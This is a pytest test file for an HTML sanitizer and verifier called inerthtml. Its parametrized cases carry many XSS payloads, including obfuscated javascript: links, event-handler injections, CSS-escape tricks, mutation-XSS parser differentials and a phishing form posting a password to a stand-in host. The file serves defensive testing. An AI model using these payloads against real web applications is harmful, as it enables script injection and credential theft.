"""Tests for inert. Sanitizer/verifier tests need no browser; render tests
are skipped automatically when Chromium for Playwright isn't installed."""

import pathlib
import re

import pytest

from inerthtml import CSP, sanitize, verify
from inerthtml.cli import main

HERE = pathlib.Path(__file__).parent
EXAMPLES = HERE.parent / "examples"


def inert(body, head="", base="https://example.com/doc/"):
    html = f"<!DOCTYPE html><html><head>{head}</head><body>{body}</body></html>"
    out, _ = sanitize(html, base, offline=True)
    assert verify(out) == [], verify(out)
    return out


# --- the output always carries the policy -------------------------------------

def test_csp_first_in_head():
    out = inert("<p>hi</p>")
    head = out.split("<head>", 1)[1]
    assert head.startswith('<meta charset="utf-8"/><meta content="' + CSP)


def test_fragment_without_html_tag_gets_wrapped():
    out, _ = sanitize("<p>just a fragment</p>", offline=True)
    assert verify(out) == []
    assert "just a fragment" in out


# --- active content is removed ------------------------------------------------

@pytest.mark.parametrize("snippet", [
    "<script>alert(1)</script>",
    "<svg><script>alert(1)</script></svg>",
    "<iframe src='https://evil.example'></iframe>",
    "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
    "<object data='x.swf'></object>",
    "<embed src='x.swf'>",
    "<base href='https://evil.example/'>",
    "<noscript><img src=x></noscript>",
    "<template><script>alert(1)</script></template>",
    "<video src='https://evil.example/v.mp4'></video>",
    "<svg><foreignObject><form action='https://evil.example'><input></form></foreignObject></svg>",
])
def test_dangerous_elements_removed(snippet):
    out = inert(snippet)
    assert not re.search(r"<(script|iframe|object|embed|base|noscript|template|video|foreignobject)\b",
                         out, re.I)


@pytest.mark.parametrize("snippet", [
    "<p onclick='alert(1)'>x</p>",
    "<img src=x onerror='alert(1)'>",
    "<body onload='alert(1)'>",
    "<svg onload='alert(1)'></svg>",
    "<details open ontoggle='alert(1)'>x</details>",
])
def test_event_handlers_removed(snippet):
    assert not re.search(r"\son\w+=", inert(snippet), re.I)


@pytest.mark.parametrize("href", [
    "javascript:alert(1)",
    "JaVaScRiPt:alert(1)",
    "java\tscript:alert(1)",
    " javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "vbscript:msgbox(1)",
    "file:///etc/passwd",
])
def test_unsafe_links_removed(href):
    out = inert(f'<a href="{href}">x</a>')
    assert "href" not in out.split("<body>", 1)[1]


def test_svg_link_and_animation_tricks():
    out = inert('<svg><a xlink:href="javascript:alert(1)"><text>x</text></a>'
                '<a><set attributeName="href" to="javascript:alert(1)"/><text>y</text></a>'
                '<use href="https://evil.example/sprite.svg#i"/></svg>')
    assert "javascript" not in out and "evil.example" not in out


def test_safe_links_kept_and_labelled():
    out = inert('<a href="https://example.org/x">a</a><a href="#top">b</a>'
                '<a href="mailto:a@b.c">c</a><a href="rel/page">d</a>')
    assert 'href="https://example.org/x"' in out
    assert 'title="https://example.org/x"' in out          # real destination shown
    assert 'rel="noopener noreferrer nofollow"' in out
    assert 'href="#top"' in out and 'href="mailto:a@b.c"' in out
    assert 'href="https://example.com/doc/rel/page"' in out  # resolved against base


def test_strip_links():
    out, _ = sanitize('<a href="https://example.org">keep text</a>', strip_links=True)
    assert "keep text" in out and "example.org" not in out


# --- phishing building blocks -------------------------------------------------

def test_forms_neutralised_but_visible():
    out = inert('<form action="https://evil.example/steal" method="post">'
                '<input type="email" placeholder="email"><input type="password">'
                '<input type="hidden" name="t" value="1"><button type="submit">Go</button></form>')
    assert "<form" not in out and "evil.example" not in out
    assert 'type="password"' not in out and 'type="hidden"' not in out
    assert 'placeholder="email"' in out and "disabled" in out
    assert '<button type="button">Go</button>' in out


def test_meta_refresh_removed():
    out = inert("", head='<meta http-equiv="refresh" content="0;url=https://evil.example">')
    assert "refresh" not in out


def test_tracking_pixels_and_remote_css_removed():
    out = inert('<img src="https://tracker.example/p.gif">'
                '<p style="background:url(https://tracker.example/p.gif)">x</p>'
                '<style>@import url("https://evil.example/x.css"); .a{background:url(//evil.example/b.png)}'
                '.b{background-image:image-set("https://evil.example/c.png" 1x)}</style>'
                '<svg><rect fill="url(https://evil.example/p.svg#g)"/></svg>')
    assert "tracker.example" not in out and "evil.example" not in out


def test_css_expression_and_bindings_removed():
    out = inert('<p style="width:expression(alert(1));-moz-binding:url(x.xml#a)">x</p>')
    assert "expression(" not in out and "-moz-binding" not in out


def test_internal_svg_references_kept():
    out = inert('<svg><defs><linearGradient id="g"/></defs><rect fill="url(#g)" '
                'style="filter:url(#f)"/><use href="#g"/></svg>')
    assert 'fill="url(#g)"' in out and "url(#f)" in out and 'href="#g"' in out


# --- assets are inlined -------------------------------------------------------

def test_local_assets_inlined(tmp_path):
    (tmp_path / "a.css").write_text("@font-face{font-family:F;src:url(f.ttf)} "
                                    "body{background:url('bg.png')}")
    (tmp_path / "f.ttf").write_bytes(b"\x00\x01\x00\x00fakefont")
    (tmp_path / "bg.png").write_bytes(b"\x89PNG\r\n\x1a\nfake")
    (tmp_path / "i.png").write_bytes(b"\x89PNG\r\n\x1a\nfake")
    page = tmp_path / "p.html"
    page.write_text('<html><head><link rel="stylesheet" href="a.css"></head>'
                    '<body><img src="i.png"></body></html>')
    out, _ = sanitize(page.read_text(), page.as_uri())
    assert verify(out) == []
    assert "data:font/ttf;base64" in out and out.count("data:image/png;base64") == 2
    assert "<link" not in out


def test_unsafe_data_uris_dropped():
    out = inert('<img src="data:text/html;base64,PHNjcmlwdD4=">'
                '<p style="background:url(data:text/html,x)">x</p>')
    assert "data:text/html" not in out


# --- verify catches tampering -------------------------------------------------

@pytest.mark.parametrize("tamper", [
    lambda h: h.replace("</body>", "<script>alert(1)</script></body>"),
    lambda h: h.replace("</body>", "<a href='javascript:x'>x</a></body>"),
    lambda h: h.replace("</body>", "<p onclick='x'>x</p></body>"),
    lambda h: h.replace("</body>", "<img src='https://t.example/p.gif'></body>"),
    lambda h: h.replace("</body>", "<form action='https://e.example'></form></body>"),
    lambda h: h.replace("script-src 'none'", "script-src 'unsafe-inline'"),
    lambda h: h.replace("img-src data:", "img-src data: https:"),
    lambda h: re.sub(r'<meta content="default-src[^>]*>', "", h),
])
def test_verify_catches_tampering(tamper):
    out = inert("<p>clean</p>")
    assert verify(tamper(out)) != []


def test_verify_rejects_csp_placed_late():
    out = inert("<p>x</p>")
    csp = re.search(r'<meta content="default-src[^>]*>', out).group(0)
    moved = out.replace(csp, "").replace("</head>", csp + "</head>")
    assert verify(moved) != []


# --- examples & CLI -----------------------------------------------------------

@pytest.mark.parametrize("name", ["report.inert.html", "phishing.inert.html"])
def test_shipped_examples_pass(name):
    assert verify((EXAMPLES / name).read_text()) == []


@pytest.mark.parametrize("name", ["report.html", "phishing.html"])
def test_original_examples_fail(name):
    assert verify((EXAMPLES / name).read_text()) != []


def test_cli_verify_exit_codes(capsys):
    with pytest.raises(SystemExit) as e:
        main(["verify", str(EXAMPLES / "phishing.inert.html")])
    assert e.value.code == 0
    with pytest.raises(SystemExit) as e:
        main(["verify", str(EXAMPLES / "phishing.html")])
    assert e.value.code == 1


def test_cli_build_no_render(tmp_path):
    src = tmp_path / "x.html"
    src.write_text("<html><body><script>alert(1)</script><p>ok</p></body></html>")
    with pytest.raises(SystemExit) as e:
        main(["build", str(src), "--no-render"])
    assert e.value.code == 0
    out = (tmp_path / "x.inert.html").read_text()
    assert "<script" not in out and "ok" in out


# --- full render (needs Chromium) ---------------------------------------------

def _chromium_available():
    try:
        from playwright.sync_api import sync_playwright
        with sync_playwright() as p:
            p.chromium.launch().close()
        return True
    except Exception:
        return False


@pytest.mark.skipif(not _chromium_available(), reason="Chromium for Playwright not installed")
def test_render_freezes_js_drawn_content(tmp_path):
    from inerthtml import build
    src = tmp_path / "chart.html"
    src.write_text("""<!DOCTYPE html><html><body><div id=t></div><canvas id=c width=200 height=100></canvas>
    <script>
      document.getElementById('t').textContent = 'drawn by JS';
      const s = document.createElementNS('http://www.w3.org/2000/svg','svg');
      s.setAttribute('width', 300); s.setAttribute('height', 120);
      const r = document.createElementNS('http://www.w3.org/2000/svg','rect');
      r.setAttribute('width', 100); r.setAttribute('height', 50); s.appendChild(r);
      document.body.appendChild(s);
      const g = document.getElementById('c').getContext('2d'); g.fillRect(0,0,50,50);
    </script></body></html>""")
    out, _, problems = build(str(src), wait_ms=200, offline=True)
    assert problems == []
    assert "drawn by JS" in out
    assert "<rect" in out and 'viewbox="0 0 300 120"' in out.lower()
    assert 'data-inert-frozen="canvas"' in out and "data:image/png;base64" in out
    assert "<script" not in out and "<canvas" not in out


# --- the browser implementation (docs/inert.js) agrees with Python ---------------

PARITY_CASES = [
    "<p>clean</p>",
    "<script>alert(1)</script>",
    "<p onclick='x'>x</p>",
    "<a href='javascript:alert(1)'>x</a>",
    "<a href='https://example.org'>x</a>",
    "<img src='https://t.example/p.gif'>",
    "<form action='https://e.example'><input type=password></form>",
    "<p style='background:url(https://t.example/a.png)'>x</p>",
    "<svg><use href='https://e.example/s.svg#a'/></svg>",
    "<svg><a><set attributeName='href' to='javascript:x'/></a></svg>",
    "<iframe src='https://e.example'></iframe>",
    "<style>@import url(https://e.example/a.css)</style>",
    "<p style='background:u\\72l(https://t.example/a.png)'>x</p>",
    "<style>@\\69mport 'https://e.example/a.css';</style>",
    "<style>.a{background:\\75 rl(https://t.example/b.png)}</style>",
    "<style>.q::before{content:'\\201C'}</style>",
    "<svg><style><img src=x onerror=alert(1)></style></svg>",
    "<math><style><img src=x onerror=alert(1)></style></math>",
    "<svg><title><img src=x onerror=alert(1)></title></svg>",
    "<!--><img src=x onerror=alert(1)>-->",
    "<noembed><img src=x onerror=alert(1)></noembed>",
]


@pytest.mark.skipif(not _chromium_available(), reason="Chromium for Playwright not installed")
def test_js_and_python_agree():
    from playwright.sync_api import sync_playwright
    js = (HERE.parent / "docs" / "inert.js").read_text()
    docs = []
    for body in PARITY_CASES:
        raw = f"<!DOCTYPE html><html><head></head><body>{body}</body></html>"
        clean, _ = sanitize(raw, "https://example.com/", offline=True)
        docs += [raw, clean]
    with sync_playwright() as p:
        page = p.chromium.launch().new_page()
        page.set_content("<html><body></body></html>")
        page.add_script_tag(content=js)
        js_verdicts = page.evaluate("docs => docs.map(d => Inert.verify(d).length === 0)", docs)
        js_lite = page.evaluate("docs => docs.map(d => Inert.sanitize(d).html)", docs)
    py_verdicts = [verify(d) == [] for d in docs]
    assert js_verdicts == py_verdicts
    for out in js_lite:                     # the browser sanitizer's output passes Python verify
        assert verify(out) == [], verify(out)


def test_import_without_semicolon():
    out = inert("<style>@import url(https://e.example/a.css)</style>")
    assert "@import" not in out


@pytest.mark.parametrize("css", [
    "u\\72l(https://t.example/a.png)",
    "\\75 rl(https://t.example/b.png)",
    "\\u\\r\\l(https://t.example/c.png)",
])
def test_css_escapes_cannot_hide_urls(css):
    out = inert(f'<p style="background:{css}">x</p><style>.a{{background:{css}}}</style>')
    assert "t.example" not in out


def test_css_escaped_import_caught_by_verify():
    clean = inert("<p>x</p>")
    assert verify(clean.replace("</body>", "<style>@\\69mport 'https://e.example/a.css';</style></body>")) != []


def test_harmless_css_escapes_kept():
    out = inert("<style>.q::before{content:'\\201C'}</style>")
    assert "\\201C" in out


# --- parser differentials: verify must see what a browser sees ---------------------

@pytest.mark.parametrize("payload", [
    "<svg><style><img src=x onerror=alert(1)></style></svg>",
    "<math><style><img src=x onerror=alert(1)></style></math>",
    "<svg><title><img src=x onerror=alert(1)></title></svg>",
    "<!--><img src=x onerror=alert(1)>-->",
    "<script/src=data:,alert(1)></script>",
])
def test_parser_differentials(payload):
    clean = inert("<p>x</p>")
    assert verify(clean.replace("</body>", payload + "</body>")) != []
    out = inert(payload)
    assert "onerror" not in out
